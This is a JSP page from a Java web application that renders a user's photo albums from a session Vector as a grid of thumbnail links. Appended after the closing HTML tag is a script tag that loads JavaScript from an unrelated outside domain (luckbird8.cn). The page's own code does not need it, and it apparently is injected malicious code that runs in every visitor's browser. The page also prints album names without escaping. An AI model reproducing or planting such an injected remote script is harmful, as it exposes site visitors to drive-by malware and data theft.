<%@ page
 contentType="text/html;charset=GBK"
 import="java.util.*,com.javabean.AlbumInfo"
 session="true"
%>
<html>
<head>
	<title></title>
	<style type="text/css">
	.newjoyo_vcd1 {
	  border-bottom:1px ridge #C49238;border-left:1px ridge #C49238;
	  border-right:1px ridge #C49238;border-top:1px ridge #C49238;
	  line-height:18px;
	}
	</style>
</head>
<body>
<center>
	<form action="AlbumServlet" method="post">
	<table border="0" width="90%" height="90%"
		   style="border-color:#C49238"
	       class="newjoyo_vcd1" cellpadding="0" cellspacing="0"
	       bgcolor="azure">
	<tr><td height="10"></td></tr>
	<tr align="center">
	<%
	Vector vec=(Vector)session.getAttribute("userAlbum");
	for(Enumeration enu=vec.elements();enu.hasMoreElements();) {
		AlbumInfo ai=(AlbumInfo)enu.nextElement();
		if(vec.size()%5==0) {
			out.println("<br>");
		}
	%>
	<td align="center">
		<table border="0" width="15%" height="20%"
			   style="border-color:#000000"
			   class="newjoyo_vcd1" cellpadding="0" cellspacing="0">
		<tr height="100" align="center"><td><img src="image/
			<%= ai.getAlbumTypeId() %>.jpg" width="110" height="100">
		</td></tr>
		<tr height="20" align="center"><td>
			<a href="AlbumServlet?action=photo&albumId=<%= ai.getAlbumId() %>"
		   	   target="_blank"><%= ai.getAlbumName() %></a></td></tr>
		</table>
	</td>
	<%
	}
	%>
	</tr></table></form></center>
</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>